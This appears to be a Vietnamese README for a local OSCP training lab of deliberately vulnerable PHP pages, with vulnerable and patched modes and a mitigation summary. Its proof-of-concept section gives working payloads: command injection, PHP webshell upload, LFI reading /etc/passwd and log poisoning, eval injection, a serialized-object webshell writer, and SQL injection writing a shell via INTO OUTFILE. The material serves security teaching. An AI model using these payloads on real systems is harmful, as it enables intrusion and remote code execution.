# Lab: Các lỗ hổng web dẫn tới RCE (PEN-200 / OSCP)

> ⚠️ **Chỉ chạy trong lab cục bộ.** Các trang trong thư mục này cố ý chứa lỗ hổng.
> Mỗi trang có 2 chế độ: `?mode=vuln` (dính lỗi) và `?mode=safe` (đã vá) để so sánh.

## Khởi động
```bash
docker compose up -d --build
# Menu:  http://localhost:8000/vuln/
```

## Bảng tổng hợp

| # | Lỗ hổng | CWE | File | Cơ chế dẫn tới RCE |
|---|---------|-----|------|--------------------|
| 1 | OS Command Injection | CWE-78 | `1_command_injection.php` | Nối input vào shell |
| 2 | Unrestricted File Upload | CWE-434 | `2_file_upload.php` | Upload `.php` webshell |
| 3 | Local File Inclusion | CWE-98 | `3_lfi.php` | Wrapper / log poisoning |
| 4 | Code Injection (eval) | CWE-95 | `4_eval_calc.php` | `eval()` input |
| 5 | PHP Object Injection | CWE-502 | `5_unserialize.php` | Gadget `__destruct` ghi file |
| 6 | SQLi → OUTFILE | CWE-89 | `6_sqli_outfile.php` | UNION … INTO OUTFILE |

## PoC nhanh (đã kiểm chứng trong lab)

**1 — Command Injection**
```
POST /vuln/1_command_injection.php?mode=vuln   host=127.0.0.1; id
```

**2 — File Upload → webshell**
```bash
echo '<?php system($_GET["c"]); ?>' > shell.php
curl -F file=@shell.php http://localhost:8000/vuln/2_file_upload.php?mode=vuln
curl 'http://localhost:8000/vuln/uploads/shell.php?c=id'
```

**3 — LFI**
```
?mode=vuln&page=/etc/passwd
?mode=vuln&page=php://filter/convert.base64-encode/resource=/var/www/html/login.php
# Log poisoning: gửi User-Agent chứa <?php system($_GET['c']); ?> rồi
?mode=vuln&page=/var/log/apache2/access.log&c=id
```

**4 — eval()**
```
POST /vuln/4_eval_calc.php?mode=vuln   expr=system('id')
```

**5 — PHP Object Injection** (tạo payload rồi đặt cookie `prefs`)
```bash
php -r 'class Logger{public $file;public $data;}
  $o=new Logger();$o->file="/var/www/html/vuln/uploads/poi.php";
  $o->data="<?php system(\$_GET[\"c\"]); ?>";
  echo rawurlencode(serialize($o));'
curl --cookie "prefs=<PAYLOAD>" 'http://localhost:8000/vuln/5_unserialize.php?mode=vuln'
curl 'http://localhost:8000/vuln/uploads/poi.php?c=id'
```

**6 — SQLi → INTO OUTFILE**
```
q=' UNION SELECT 1,@@version,@@secure_file_priv-- -
q=' UNION SELECT 1,'<?php system($_GET["c"]); ?>','x' INTO OUTFILE '/shared/shell.php'-- -
→ /vuln/uploads/shell.php?c=id
```
Điều kiện: user DB có quyền `FILE` + `secure_file_priv` trỏ thư mục ghi được
(lab đặt `--secure-file-priv=/shared`, bind tới `./vuln/uploads`).

## Phòng chống (tóm tắt)
- **CMDi/eval**: không đưa input vào shell/eval; allow-list + `escapeshellarg`; dùng API thay shell.
- **Upload**: allow-list đuôi + MIME thật (`finfo`); đổi tên ngẫu nhiên; thư mục upload cấm thực thi PHP.
- **LFI**: allow-list trang; `allow_url_include=Off`; `realpath()` + kiểm tra prefix.
- **Deserialization**: không `unserialize()` dữ liệu không tin; dùng JSON; `allowed_classes=false`; HMAC.
- **SQLi**: prepared statements (xem `../login.php`); tài khoản DB tối thiểu quyền, bỏ `FILE`.
